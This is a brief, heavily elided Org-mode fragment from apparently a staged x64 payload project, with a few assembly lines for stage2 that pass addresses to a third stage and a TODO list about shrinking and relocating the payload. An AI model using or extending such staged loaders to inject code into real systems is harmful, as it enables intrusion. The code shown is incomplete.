...
#+begin_src asm :tangle payload/x64/stage2.s :mkdirp yes
  ...
  jmp_pad_s3:			;;[rsp]s2, interp_vaddr, (vaddr, size) s3, vaddr s2
  .jmp_entry_for_s3:
  ...
  _start:		 ;r15 aslr
  	...
  	pop r11
  	push r11
  	push QWORD [rsp+0x10] ;[rsp]va s2, interp_vaddr, vaddr_s3, size, vaddr s2
  	ret
...
- [-] Reduce bytecode.
  ...
  - [ ] Delete function just used once. (set_auxv, get_at interp, write_dyn, ...)
...
- [ ] Easy to modify payload.
  - [ ] Change payload pos, and update s1 & s2.
